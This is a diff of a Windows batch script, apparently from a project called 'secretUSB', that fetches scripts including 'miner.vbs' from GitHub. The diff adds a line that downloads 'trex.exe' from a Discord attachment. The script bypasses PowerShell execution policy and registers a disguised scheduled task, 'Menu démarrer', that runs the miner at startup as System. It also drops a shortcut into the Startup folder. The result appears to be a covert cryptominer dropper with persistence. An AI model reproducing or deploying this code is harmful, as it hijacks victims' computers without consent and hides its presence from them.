@@ -88,10 +88,10 @@ curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/logs.bat
 curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/logs.ps1
 curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/raccourci.ps1
 curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/miner.vbs
+curl -O https://cdn.discordapp.com/attachments/770287390429806613/1114322345339924531/trex.exe
 
 powershell.exe -ExecutionPolicy Bypass -File raccourci.ps1
 
-start powershell.exe -ExecutionPolicy Bypass -File dowload.ps1
 schtasks /create /tn "Menu démarrer" /tr "%USERPROFILE%\AppData\Roaming\System_logs\miner.vbs" /sc onstart /ru System
 
 move C:\logs.lnk "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
